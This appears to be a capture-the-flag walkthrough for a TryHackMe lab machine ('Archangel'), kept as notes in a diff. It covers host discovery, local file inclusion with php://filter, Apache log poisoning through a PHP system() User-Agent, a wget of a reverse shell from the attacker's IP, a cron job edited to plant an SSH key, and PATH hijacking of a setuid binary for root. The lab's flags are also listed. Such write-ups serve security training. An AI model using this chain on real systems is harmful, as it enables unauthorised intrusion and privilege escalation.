@@ -1,0 +1,144 @@
+start by nmap scan using rustscan 
+2 open ports 22 and 80 
+ssh 22
+http 80 
+
+glazing throught the website the thm domain stands out in the support@mafialive.thm 
+
+add that to the host names 
+meth 1.echo '10.10.185.194 mafialive.thm' >> /etc/hosts
+meth 2.echo "10.10.185.194 mafialive.thm" | sudo tee -a /etc/hosts
+
+found the flag 1 : thm{f0und_th3_r1ght_h0st_n4m3} 
+
+dirsearch -u http://mafialive.thm -e txt,html,php -w /usr/share/wordlists/dirb/common.txt -t64 -f
+looking for the page under development found out the robots.txt 
+found the test.php  
+
+
+It is obvious that we have to deal with a Local File Inclusion (LFI). Unfortunately, it seems we can’t read the code in test.php, probably due to a protection in the script. Hopefully, using php://filter allows to bypass the protection and we are able to encode the file as a base64 string:
+curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+
+CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==
+
+decoding it in base64 gives 
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+
+	    //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+	    if(isset($_GET["view"])){
+	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
+            	include $_GET['view'];
+            }else{
+
+		echo 'Sorry, Thats not allowed';
+            }
+	}
+        ?>
+    </div>
+</body>
+
+</html>
+
+flag 2 : thm{explo1t1ng_lf1} 
+
+/////if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing'))////
+this line tells that the site filters out every request which contains ../.. and the requests must include /var/www/html/development_testing 
+this is done to protect the site from lfi atytacks 
+
+we can bypass this in different ways :-
+1. by adding // instead of /
+2. by adding or reducing the number of dots in the request ... or . instead of ..
+
+the useragent is changed to execute a command 
+GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log HTTP/1.1
+Host: mafialive.thm
+User-Agent: <?php system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+and the the php reverse shell is uploaded using the python3 -m http.server 4444
+and is being received by the 
+GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget http://10.8.179.136:4444/php-rev.php HTTP/1.1
+
+starting netcat to listen on port 1234 to receive the call back from the reverse shell
+nv -lnvp 1234
+
+searching for http://mafialive.thm/php-rev.php to activate the reverse shell 
+
+got a shell through netcat 
+
+userflag : thm{lf1_t0_rc3_1s_tr1cky}
+
+checking the cronjobs using cat /etc/crontab
+noticed a helloworld.sh set to run every minute
+
+the helloworld.sh is edited to include am autherised ssh key 
+and after a minute the helloworld.sh will be executed 
+ssh into the machine and gain access 
+
+user2 flag : thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+
+privesc : 
+
+The secret directory contains an interesting backup script that has the SETUID bit set. Using strings, we can see that the cp command is called to copy files:
+
+archangel@ubuntu:~/secret$ file backup 
+backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
+archangel@ubuntu:~/secret$ strings backup 
+/lib64/ld-linux-x86-64.so.2
+setuid
+system
+
+[REDACTED]
+
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+
+[REDACTED]
+
+As the script is not using the full path of cp, we can leave our own cp program in the directory.
+
+archangel@ubuntu:~/secret$ cat > cp << EOF
+> #!/bin/bash
+> /bin/bash -i
+> EOF
+archangel@ubuntu:~/secret$ chmod +x cp
+archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
+
+Now, when we will execute the script, it will use our own cp command, which will execute a root shell:
+
+archangel@ubuntu:~/secret$ ./backup 
+root@ubuntu:~/secret# id
+uid=0(root) gid=0(root) groups=0(root),1001(archangel)
+root@ubuntu:~/secret# cd /root/
+root@ubuntu:/root# ll
+total 28
+drwx------  4 root root 4096 Nov 20 15:22 ./
+drwxr-xr-x 22 root root 4096 Nov 16 15:39 ../
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Nov 18 13:06 .cache/
+drwxr-xr-x  3 root root 4096 Nov 16 19:27 .local/
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   68 Nov 19 19:59 root.txt
+root@ubuntu:/root# cat root.txt 
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
+
+Root flag: thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
+
+
